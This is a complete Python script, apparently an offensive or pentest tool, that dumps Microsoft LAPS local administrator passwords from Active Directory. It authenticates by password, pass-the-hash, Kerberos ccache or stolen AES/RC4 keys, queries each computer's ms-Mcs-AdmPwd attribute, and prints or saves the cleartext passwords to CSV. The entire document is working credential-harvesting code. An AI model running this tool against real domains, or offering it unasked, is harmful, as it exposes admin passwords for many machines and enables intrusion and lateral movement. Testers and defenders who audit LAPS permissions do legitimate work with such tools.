#!/usr/bin/env python3
"""
Dump LAPS passwords using msldap 0.5.15 with Impacket-style target/auth.

Target format (required):
    domain.tld/username[:password][@dc-fqdn]

Auth flags:
    -no-pass
    -hashes LMHASH:NTHASH       # NTLM PtH, or Kerberos RC4 when -k is set
    -k                          # Kerberos (ccache first, then CLI creds)
    -aesKey <hex>               # Kerberos AES key (32 hex for AES128, 64 for AES256)

Connection/TLS:
    --scheme {ldap,ldaps}       # default: ldaps
    --channel-binding {none,tls-server-end-point,tls-unique}  # LDAPS only
    -dc-ip <ip-or-fqdn>         # alternative to @dc-fqdn; allows IP fallback

Examples:
    NTLM (password):
      laps_dump_msldap.py corp.example.com/alice:Secret@dc01.corp.example.com

    NTLM (PtH):
      laps_dump_msldap.py corp.example.com/alice@dc01.corp.example.com -no-pass -hashes aad3...:8846...

    Kerberos via ccache:
      KRB5CCNAME=/tmp/krb5cc_1000 laps_dump_msldap.py corp.example.com/alice@dc01.corp.example.com -k -no-pass

    Kerberos (RC4 from -hashes):
      laps_dump_msldap.py corp.example.com/alice@dc01.corp.example.com -k -no-pass -hashes aad3...:8846...

    Kerberos (AES-256):
      laps_dump_msldap.py corp.example.com/alice@dc01.corp.example.com -k -no-pass -aesKey <64 hex>

    LDAP over IP when DNS fails:
      laps_dump_msldap.py corp.example.com/alice -no-pass -hashes aad3...:8846... -dc-ip 10.0.0.10 --scheme ldap
"""

import argparse
import asyncio
import ipaddress
import os
import sys
from datetime import datetime
from typing import Optional, Tuple, List
from urllib.parse import quote

from msldap.commons.factory import LDAPConnectionFactory

LAPS_ATTRS = ['ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime', 'cn']
EPOCH_AD_DIFF = 11644473600  # seconds between 1601-01-01 and 1970-01-01


# ---------------------------
# Helpers
# ---------------------------

def base_creator(domain_fqdn: str) -> str:
    # "example.corp" -> "DC=example,DC=corp"
    return ",".join(f"DC={p}" for p in domain_fqdn.split("."))


def _is_ip_addr(s: str) -> bool:
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def parse_target(target: str) -> Tuple[str, str, Optional[str], Optional[str]]:
    """
    Parse 'domain.tld/username[:password][@dc-fqdn]'.
    Returns: (domain_fqdn, username, password_or_None, dc_fqdn_or_None)

    Enforces: @dc must be FQDN (not IP). For IPs, use -dc-ip.
    """
    dc_host = None
    if '@' in target:
        left, dc_host = target.rsplit('@', 1)
    else:
        left = target

    if '/' not in left:
        raise ValueError("Target must be 'domain.tld/username[:password][@dc-fqdn]'")

    domain_fqdn, user_and_pass = left.split('/', 1)
    if not domain_fqdn or not user_and_pass:
        raise ValueError("Invalid target. Example: corp.example.com/alice:Pass@dc01.corp.example.com")

    if ':' in user_and_pass:
        username, password = user_and_pass.split(':', 1)
    else:
        username, password = user_and_pass, None

    if not username:
        raise ValueError("Username missing in target")

    if dc_host and _is_ip_addr(dc_host):
        raise ValueError("The @dc-host in the target must be a FQDN. Use -dc-ip for IPs.")

    return domain_fqdn, username, password, dc_host


def parse_hashes(hashes: str) -> Tuple[str, str]:
    """
    Impacket-style '-hashes LMHASH:NTHASH' (LM may be 'aad3...').
    Returns (lmhash, nthash), validated and lowercased.
    """
    if ':' not in hashes:
        raise ValueError("-hashes must be in 'LMHASH:NTHASH' format")
    lm, nt = hashes.split(':', 1)
    lm = lm.lower()
    nt = nt.lower()
    if len(lm) != 32 or any(c not in '0123456789abcdef' for c in lm):
        raise ValueError("LMHASH must be 32 hex characters")
    if len(nt) != 32 or any(c not in '0123456789abcdef' for c in nt):
        raise ValueError("NTHASH must be 32 hex characters")
    return lm, nt


def is_hex(s: str) -> bool:
    try:
        int(s, 16)
        return True
    except Exception:
        return False


def ad_filetime_to_epoch(ad_filetime_val) -> Optional[int]:
    try:
        ad = int(str(ad_filetime_val))
        return (ad // 10_000_000) - EPOCH_AD_DIFF
    except Exception:
        return None


def escape_filter_value(val: str) -> str:
    # Minimal RFC4515 escaping; good for hostnames/CNs.
    return (val.replace('\\', r'\5c')
               .replace('*', r'\2a')
               .replace('(', r'\28')
               .replace(')', r'\29')
               .replace('\x00', r'\00'))


def build_filter(computer: Optional[str]) -> str:
    if computer:
        cn = escape_filter_value(computer)
        return f"(&(objectCategory=computer)(ms-Mcs-AdmPwd=*)(cn={cn}))"
    return "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))"


def build_query_params(scheme: str, channel_binding: str, dc_for_kerberos: Optional[str]) -> str:
    params = []
    if scheme == 'ldaps' and channel_binding and channel_binding != 'none':
        params.append(f"channel_binding={channel_binding}")
    if dc_for_kerberos:
        params.append(f"dc={dc_for_kerberos}")
    return ("?" + "&".join(params)) if params else ""


def userpart(domain_fqdn: str, username: str) -> str:
    # msldap URL userinfo typically 'DOMAIN\\user'. We use the FQDN as provided.
    return f"{domain_fqdn}\\{username}"


async def try_connect_and_bind(url: str):
    factory = LDAPConnectionFactory.from_url(url)
    conn = factory.get_connection()
    try:
        await conn.connect()
        await conn.bind()
        return conn
    except Exception:
        try:
            await conn.close()
        except Exception:
            pass
        raise


async def connect_with_candidates(urls: List[str]):
    last_err = None
    for url in urls:
        try:
            return await try_connect_and_bind(url), url
        except Exception as e:
            last_err = e
    if last_err:
        raise last_err
    raise RuntimeError("No connection attempts were made")


def select_connect_host(
    scheme: str,
    domain_fqdn: str,
    dc_fqdn_from_target: Optional[str],
    dc_ip_cli: Optional[str]
) -> Tuple[str, Optional[str]]:
    """
    Decide:
      - connect_host (URL host we actually connect to)
      - dc_for_kerberos (value for msldap '?dc=')

    Rules:
      * If @dc-FQDN is present, use it as connect_host (good for LDAPS).
      * Else if -dc-ip is present, use the IP as connect_host (helps if DNS fails).
      * Else fall back to the domain FQDN.
      * For Kerberos 'dc=', prefer -dc-ip when given; otherwise use @dc-FQDN or the chosen host.
    """
    if dc_fqdn_from_target:
        connect_host = dc_fqdn_from_target
    elif dc_ip_cli:
        connect_host = dc_ip_cli
    else:
        connect_host = domain_fqdn

    dc_for_kerberos = dc_ip_cli or dc_fqdn_from_target or connect_host

    if scheme == 'ldaps' and _is_ip_addr(connect_host):
        print("[!] LDAPS with an IP host may fail certificate/SNI checks. Prefer @dc-FQDN or use --scheme ldap.")
    return connect_host, dc_for_kerberos


def build_candidate_urls(
    scheme: str,
    channel_binding: str,
    use_kerberos: bool,
    domain_fqdn: str,
    username: str,
    password: Optional[str],
    no_pass: bool,
    hashes: Optional[str],
    aes_key: Optional[str],
    connect_host: str,
    dc_for_kerberos: Optional[str],
    base_dn: str,
) -> List[str]:
    """
    Returns a list of msldap URLs to try, in order of preference.
      - For -k: ccache -> aes -> rc4 (from -hashes) -> password
      - For NTLM: hashes -> password
    """
    up = userpart(domain_fqdn, username)

    def url(auth: str, secret: str, add_dc: bool) -> str:
        qp = build_query_params(scheme, channel_binding, dc_for_kerberos if add_dc else None)
        return f"{scheme}+{auth}://{up}:{secret}@{connect_host}/{base_dn}/{qp}"

    urls: List[str] = []

    if use_kerberos:
        # 1) ccache via KRB5CCNAME
        ccache = os.environ.get("KRB5CCNAME")
        if ccache:
            secret = quote(ccache, safe="/\\._:-")
            urls.append(url("kerberos-ccache", secret, add_dc=True))

        # 2) AES key (32 or 64 hex)
        if aes_key:
            k = aes_key.lower()
            if not (is_hex(k) and len(k) in (32, 64)):
                raise ValueError("-aesKey must be 32 (AES128) or 64 (AES256) hex characters")
            urls.append(url("kerberos-aes", k, add_dc=True))

        # 3) RC4 from -hashes (use NTHASH)
        if hashes:
            _, nt = parse_hashes(hashes)
            urls.append(url("kerberos-rc4", nt, add_dc=True))

        # 4) Kerberos password (if supplied and not suppressed)
        if (password is not None) and (not no_pass):
            pw = quote(password, safe="")
            urls.append(url("kerberos-password", pw, add_dc=True))

    else:
        # NTLM
        if hashes:
            _, nt = parse_hashes(hashes)
            urls.append(url("ntlm-nt", nt, add_dc=False))
        if (password is not None) and (not no_pass):
            pw = quote(password, safe="")
            urls.append(url("ntlm-password", pw, add_dc=False))

    if not urls:
        raise ValueError(
            "No usable credentials. For Kerberos use -k with ccache/-aesKey/-hashes or a password. "
            "For NTLM provide a password in the target or -hashes (LM:NT). "
            "If no password is provided, add -no-pass."
        )
    return urls


def write_csv_header(path: str):
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8", newline="") as f:
            f.write("Computer,Password,Expiration Time,Epoch Expiration Time,Query Time\n")


def coerce_first(val):
    if isinstance(val, (list, tuple)):
        return val[0] if val else None
    return val


def to_str(v) -> str:
    if v is None:
        return ""
    if isinstance(v, bytes):
        return v.decode("utf-8", errors="ignore")
    return str(v)


# ---------------------------
# Main logic
# ---------------------------

async def dump_laps(args):
    # Parse Impacket-style target
    domain_fqdn, username, password, dc_from_target = parse_target(args.target)

    # Enforce: either password present in target or -no-pass supplied
    if password is None and not args.no_pass:
        raise ValueError("No password in target. Supply -no-pass when using -hashes/-aesKey/-k with ccache.")

    base_dn = base_creator(domain_fqdn)
    ldap_filter = build_filter(args.computer)

    now = datetime.now()
    runtime = now.strftime("%m-%d-%Y %H:%M:%S")
    print(f"LAPS Dumper (msldap) - Running at {runtime}")

    out_path = None
    if args.output:
        out_path = args.output + now.strftime("-%m-%d-%Y.csv")
        write_csv_header(out_path)

    connect_host, dc_for_kerberos = select_connect_host(args.scheme, domain_fqdn, dc_from_target, args.dc_ip)

    urls = build_candidate_urls(
        scheme=args.scheme,
        channel_binding=args.channel_binding,
        use_kerberos=args.k,
        domain_fqdn=domain_fqdn,
        username=username,
        password=password,
        no_pass=args.no_pass,
        hashes=args.hashes,
        aes_key=args.aesKey,
        connect_host=connect_host,
        dc_for_kerberos=dc_for_kerberos,
        base_dn=base_dn,
    )

    conn, _used_url = await connect_with_candidates(urls)

    try:
        results = await conn.search(base_dn, ldap_filter, attributes=LAPS_ATTRS)
        any_found = False
        for entry in results or []:
            # Normalize attributes
            if isinstance(entry, dict):
                attrs = entry.get("attributes") or entry.get("raw_attributes") or {}
            else:
                # best-effort attribute access
                attrs = {
                    "cn": getattr(entry, "cn", None),
                    "ms-Mcs-AdmPwd": getattr(entry, "ms-Mcs-AdmPwd", None),
                    "ms-Mcs-AdmPwdExpirationTime": getattr(entry, "ms-Mcs-AdmPwdExpirationTime", None),
                }

            cn = to_str(coerce_first(attrs.get("cn")))
            pwd = to_str(coerce_first(attrs.get("ms-Mcs-AdmPwd")))
            exp = coerce_first(attrs.get("ms-Mcs-AdmPwdExpirationTime"))
            epoch = ad_filetime_to_epoch(exp) if exp is not None else None
            exp_human = datetime.fromtimestamp(epoch).strftime("%m-%d-%Y") if epoch else ""

            print(f"{cn} {pwd}")
            any_found = True

            if out_path:
                with open(out_path, "a", encoding="utf-8", newline="") as f:
                    f.write(f'{cn},"{pwd}",{exp_human},{epoch if epoch else ""},{runtime}\n')

        if not any_found:
            print("No LAPS passwords found or access denied for ms-Mcs-AdmPwd.")

    except Exception as ex:
        msg = str(ex) or repr(ex)
        if "invalid attribute type ms-MCS-AdmPwd" in msg or "invalid attribute type ms-Mcs-AdmPwd" in msg:
            print("This domain does not have LAPS configured (attribute absent).")
        else:
            print(f"Error during search: {msg}")
    finally:
        try:
            await conn.close()
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(
        description="Dump LAPS passwords (msldap 0.5.15) with Impacket-style target/auth"
    )

    # Required Impacket-style target
    parser.add_argument(
        "target",
        help="Impacket-style target: domain.tld/username[:password][@dc-fqdn]"
    )

    # Filtering/output
    parser.add_argument("-c", "--computer", help="Target computer CN (optional)")
    parser.add_argument("-o", "--output", help="Output CSV file prefix (date suffix added)")

    # Protocol & TLS
    parser.add_argument("--scheme", choices=["ldap", "ldaps"], default="ldaps",
                        help="LDAP or LDAPS (default: ldaps)")
    parser.add_argument("--channel-binding", choices=["none", "tls-server-end-point", "tls-unique"],
                        default="none", help="LDAPS channel binding (default: none)")

    # DC selection alternative
    parser.add_argument("-dc-ip", dest="dc_ip",
                        help="Domain Controller hostname/IP (alternative to @dc-fqdn in target)")

    # Auth flags (Impacket-secretsdump style)
    parser.add_argument("-no-pass", dest="no_pass", action="store_true",
                        help="Do not use a password (required if password not supplied in target)")
    parser.add_argument("-hashes",
                        help="LMHASH:NTHASH. With -k uses RC4 for Kerberos; without -k uses NTLM PtH")
    parser.add_argument("-k", action="store_true",
                        help="Use Kerberos. Tries ccache (KRB5CCNAME) first; falls back to CLI creds if needed")
    parser.add_argument("-aesKey", dest="aesKey",
                        help="Kerberos AES key (32 hex for AES128 or 64 hex for AES256)")

    args = parser.parse_args()

    try:
        asyncio.run(dump_laps(args))
    except KeyboardInterrupt:
        print("Canceled.")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(2)


if __name__ == "__main__":
    main()